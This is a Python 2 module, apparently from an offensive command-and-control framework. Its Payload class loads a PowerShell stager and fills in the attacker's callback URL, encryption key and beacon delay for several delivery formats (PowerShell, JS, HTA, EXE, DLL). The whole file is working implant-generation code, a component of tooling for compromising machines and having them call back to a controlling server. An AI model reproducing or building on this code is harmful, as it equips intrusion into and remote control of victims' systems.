"""
    @author: Mr.Un1k0d3r RingZer0 Team
    @package: core/payload.py
"""
from core.utils import Utils

class Payload:
	DEFAULT_DELAY = 10000
	DEFAULT_TYPE = "ps"

	def __init__(self, config):
		self.config = config
		self.type = {}
		self.type["ps"] = "stager.ps1"
		self.type["js"] = "stager.ps1"
		self.type["hta"] = "stager.ps1"
		self.type["exe"] = "stager.ps1"
		self.type["dll"] = "stager.ps1"
		
		self.delay = Payload.DEFAULT_DELAY
		self.option = Payload.DEFAULT_TYPE

	def set_type(self, type):
		if type in self.type:
			self.option = type

	def set_delay(self, delay):
		try:
			self.delay = int(delay)
		except:
			print "HELLO"
			self.delay = Payload.DEFAULT_DELAY

	def get_output(self):
		output = Utils.load_powershell_script(self.type[self.option], 100)
		output = output.replace("[URL]", self.get_url()).replace("[KEY]", self.config.get("encryption-key")).replace("[DELAY]", str(self.delay))
		return output

	def get_url(self):
		url = "http://"
		if self.config.get("https-enabled") == "on":
			url = "https://"
		url += "%s:%s/" % (self.config.get("http-fqdn"), str(self.config.get("http-port")))
		return url

